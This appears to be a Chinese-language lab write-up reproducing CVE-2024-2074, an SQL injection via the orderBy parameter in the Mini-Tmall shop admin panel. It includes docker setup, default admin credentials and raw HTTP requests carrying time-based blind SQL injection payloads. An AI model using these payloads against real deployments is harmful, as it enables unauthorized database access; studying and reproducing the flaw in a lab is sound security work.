# CVE-2024-2074 SpringBoot迷你天猫商城Mini-Tmall sql注入

Mini-Tmall是一个基于Spring Boot的迷你天猫商城。Mini-Tmall在20231017版本及之前存在一个严重的漏洞，攻击者可以利用该漏洞通过远程执行特定操作来注入恶意SQL语句，从而获取敏感信息或控制数据库。此漏洞影响文件?r=tmall/admin/user/1/1的一些未知处理，攻击者可以通过篡改orderBy参数来达成sql注入攻击。攻击者可以通过远程方式发起攻击。

版本影响 <=20231017版本

项目下载地址https://gitee.com/project_team/Tmall_demo/tree/master

参考链接：

- https://blog.csdn.net/shelter1234567/article/details/136683670
- https://github.com/yuziiiiiiiiii/CVE-2024-2074/blob/main/cve.md
- https://nvd.nist.gov/vuln/detail/CVE-2024-2074

## 漏洞环境

执行如下命令启动一个minitmall-20231017-web服务器：

```
docker compose up 
```

环境启动后，访问`http://your-ip:8080`将看到minitmall的主页面

## 漏洞复现

需要登录下后台 ，用户admin 密码123456

![](https://img-blog.csdnimg.cn/direct/664f9800839b43159ceb31ce0c64e9c8.png)

1，admin/user接口

发送payload 时间盲注

```
GET /tmall/admin/user/1/1?orderBy=if(1=1,SLEEP(3),0) HTTP/1.1
GET /tmall/admin/user/1/1?orderBy=if(1=0,SLEEP(3),0) HTTP/1.1
```

```
GET /tmall/admin/user/1/1?orderBy=if(1=1,SLEEP(3),0) HTTP/1.1
Host: 192.168.116.128:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=47A17DA7DE2B54FC5D39E161ED9A8614; username=admin; _ga=GA1.1.2049876865.1708327587; _ga_ZCZHJPMEG7=GS1.1.1709204007.4.0.1709204007.0.0.0; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1709286898; wp-settings-time-1=1709712213; __test=1; TCSESSIONID=C535ABCCFF3BD453A9744400E7499A10; PHPSESSID=30296698223c1b44b6021dd0ce8ff70f
Connection: close
```

![](https://img-blog.csdnimg.cn/direct/71bab7df101249da8b214465b7943051.png)

![](https://img-blog.csdnimg.cn/direct/d4cf76cfd8a941e89daec694056e9d74.png)

2，admin/product接口

![](https://img-blog.csdnimg.cn/direct/5e6c189d37e9470abe2ff14f2d9fc6d3.png)

![](https://img-blog.csdnimg.cn/direct/e96c849d517a49da85938c3b74e7442a.png)